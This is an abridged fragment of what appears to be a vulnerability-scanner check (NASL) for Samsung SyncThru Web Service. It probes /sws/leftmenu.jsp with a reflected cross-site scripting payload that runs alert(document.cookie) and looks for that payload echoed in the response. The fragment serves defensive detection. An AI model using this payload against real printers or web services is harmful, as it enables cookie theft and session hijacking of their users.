...
if(description){
  ...
  release, disable respective features, remove the product or replace the product by another one." );
	...
	script_dependencies( "gb_samsung_syncthru_web_service_detect.sc" );
...
url = dir + "/sws/leftmenu.jsp?ruiFw_id=activeAlert&ruiFw_pid=</script>" + "svg/onload=alert(document.cookie)>&ruiFw_title=Information";
if(http_vuln_check( port: port, url: url, pattern: "</script>svg/onload=alert\\(document.cookie\\)>", extra_check: make_list( "swsLeftMenuFrame",
	 "'Information'",
	 "'activeAlert'" ), check_header: TRUE )){
